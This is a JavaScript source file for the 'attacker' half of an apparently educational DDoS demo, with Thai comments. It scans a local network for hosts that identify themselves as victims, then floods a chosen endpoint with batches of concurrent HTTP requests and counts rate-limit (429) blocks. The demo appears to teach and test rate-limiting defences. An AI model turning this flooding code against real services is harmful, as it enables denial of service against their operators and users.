// attacker-server.js
// Attacker — สแกนหา IP ในวง LAN + ยิงโจมตี

const express = require('express');
const http = require('http');
const path = require('path');
const os = require('os');
const { Server } = require('socket.io');
const NetworkScanner = require('./scanner/networkScanner');

const app = express();
const server = http.createServer(app);
const io = new Server(server, { cors: { origin: '*' } });

const scanner = new NetworkScanner({ timeout: 800, concurrency: 100 });

// ============ STATE ============
const state = {
  scanning: false,
  targets: [],           // [{ip, port, hostname, endpoints, isVictim}]
  scanHistory: [],
};

// ============ EXCLUDED ============
const EXCLUDED = [
  '/socket.io', '/api/scan', '/api/targets', '/api/attack',
  '/api/stop', '/api/info', '/api/history',
  '/victim.js', '/attacker.js', '/favicon.ico',
];

app.use((req, res, next) => {
  if (EXCLUDED.some(p => req.path.startsWith(p))) return next();
  next();
});

// ============ INFO ============
app.get('/api/info', (req, res) => {
  res.json({
    role: 'attacker',
    hostname: os.hostname(),
    localIPs: getLocalIPs(),
  });
});

// ============ SCAN ============
app.post('/api/scan', express.json(), async (req, res) => {
  if (state.scanning) {
    return res.status(409).json({ error: 'กำลังสแกนอยู่' });
  }

  const port = parseInt(req.body.port) || 3000;
  state.scanning = true;
  state.targets = [];

  // ตอบกลับทันที
  res.json({ ok: true, message: 'เริ่มสแกน', port });

  // สแกนแบบ background
  try {
    console.log(`\n🔍 เริ่มสแกน port ${port}...`);
    io.emit('scan:start', { port });

    const results = await scanner.scan({
      port,
      onProgress: (progress) => {
        io.emit('scan:progress', progress);
      },
    });

    // หา victim จากทุก network
    const victims = [];
    for (const net of results) {
      for (const host of net.hosts) {
        // ยืนยันว่าเป็น victim ไหม — ยิง /api/info
        try {
          const info = await fetchInfo(host.ip, port);
          if (info?.isVictim) {
            victims.push({
              ip: host.ip,
              port,
              hostname: info.hostname,
              endpoints: info.endpoints,
              isVictim: true,
              protectionEnabled: info.protectionEnabled,
              discoveredAt: Date.now(),
            });
            io.emit('scan:found', victims[victims.length - 1]);
          }
        } catch (e) {
          // ไม่ใช่ victim
        }
      }
    }

    state.targets = victims;
    io.emit('scan:done', { total: victims.length, victims });
    console.log(`✅ สแกนเสร็จ — พบ ${victims.length} victim\n`);

  } catch (err) {
    console.error('Scan error:', err.message);
    io.emit('scan:error', { message: err.message });
  } finally {
    state.scanning = false;
  }
});

// ============ TARGETS ============
app.get('/api/targets', (req, res) => {
  res.json({ targets: state.targets, scanning: state.scanning });
});

// ============ ATTACK ============
const attacks = new Map(); // attackId -> { stopped }

app.post('/api/attack', express.json(), (req, res) => {
  const {
    targetIP,
    targetPort = 3000,
    endpoint = '/api/data',
    total = 2000,
    concurrency = 100,
  } = req.body;

  if (!targetIP) {
    return res.status(400).json({ error: 'ต้องระบุ targetIP' });
  }

  const attackId = `atk_${Date.now()}_${Math.random().toString(36).slice(2, 8)}`;
  attacks.set(attackId, { stopped: false });

  res.json({ ok: true, attackId });

  // ยิงแบบ background
  runAttack({ attackId, targetIP, targetPort, endpoint, total, concurrency });
});

app.post('/api/stop', express.json(), (req, res) => {
  const { attackId } = req.body;
  const atk = attacks.get(attackId);
  if (atk) {
    atk.stopped = true;
    res.json({ ok: true });
  } else {
    res.status(404).json({ error: 'ไม่พบ attack' });
  }
});

// ============ ATTACK RUNNER ============
async function runAttack({ attackId, targetIP, targetPort, endpoint, total, concurrency }) {
  const url = `http://${targetIP}:${targetPort}${endpoint}`;
  const atk = attacks.get(attackId);

  console.log(`\n⚔️  เริ่มโจมตี: ${url}`);
  console.log(`   total=${total}, concurrency=${concurrency}`);

  io.emit('attack:start', { attackId, targetIP, endpoint, total, concurrency });

  const t0 = Date.now();
  let sent = 0, ok = 0, blocked = 0, errors = 0;
  const batches = Math.ceil(total / concurrency);

  for (let b = 0; b < batches; b++) {
    if (atk.stopped) break;

    const promises = [];
    for (let i = 0; i < concurrency; i++) {
      if (sent >= total) break;
      sent++;

      promises.push(
        fetch(url, {
          cache: 'no-store',
          headers: { 'User-Agent': 'DDoS-Demo-Attacker/1.0' },
          signal: AbortSignal.timeout(5000),
        })
          .then(r => {
            if (r.status === 429) blocked++;
            else if (r.ok) ok++;
          })
          .catch(() => errors++)
      );
    }

    await Promise.all(promises);

    // ส่ง progress ทุก 10 batch
    if (b % 10 === 0 || b === batches - 1) {
      const elapsed = (Date.now() - t0) / 1000;
      io.emit('attack:progress', {
        attackId,
        sent, ok, blocked, errors,
        rps: elapsed > 0 ? Math.round(sent / elapsed) : 0,
        elapsed: elapsed.toFixed(2),
      });
    }
  }

  const dur = (Date.now() - t0) / 1000;
  const summary = {
    attackId,
    targetIP,
    endpoint,
    total: sent,
    ok, blocked, errors,
    duration: dur.toFixed(2),
    avgRps: Math.round(sent / dur),
    stopped: atk.stopped,
  };

  console.log(`🏁 เสร็จ: ${sent} req ใน ${dur.toFixed(2)}s | OK=${ok} | Blocked=${blocked} | Err=${errors}`);

  io.emit('attack:done', summary);
  attacks.delete(attackId);
}

// ============ HELPERS ============
function getLocalIPs() {
  const ifaces = os.networkInterfaces();
  const ips = [];
  Object.values(ifaces).forEach(arr => arr.forEach(i => {
    if (i.family === 'IPv4' && !i.internal) ips.push(i.address);
  }));
  return ips;
}

async function fetchInfo(ip, port) {
  try {
    const r = await fetch(`http://${ip}:${port}/api/info`, {
      signal: AbortSignal.timeout(1500),
    });
    if (!r.ok) return null;
    return await r.json();
  } catch (e) {
    return null;
  }
}

// ============ STATIC ============
app.use(express.static(path.join(__dirname, 'public')));

// ============ SOCKET.IO ============
io.on('connection', (socket) => {
  console.log('🔌 Attacker console connected');
  socket.emit('state', {
    scanning: state.scanning,
    targets: state.targets,
  });
});

// ============ START ============
const PORT = 4000;
server.listen(PORT, '0.0.0.0', () => {
  const ips = getLocalIPs();
  console.log('');
  console.log('╔═══════════════════════════════════════════════╗');
  console.log('║   ⚔️  ATTACKER SERVER (เครื่องโจมตี)          ║');
  console.log('╠═══════════════════════════════════════════════╣');
  console.log(`║   Hostname: ${os.hostname()}`.padEnd(48) + '║');
  console.log(`║   Local:    http://localhost:${PORT}             ║`);
  ips.forEach(ip => {
    console.log(`║   Network:  http://${ip}:${PORT}`.padEnd(48) + '║');
  });
  console.log('╚═══════════════════════════════════════════════╝');
  console.log('');
  console.log('👉 เปิด Attacker Console: http://<IP>:4000/attacker.html');
  console.log('');
});

process.on('SIGINT', () => {
  console.log('\n🛑 Shutting down...');
  server.close(() => process.exit(0));
});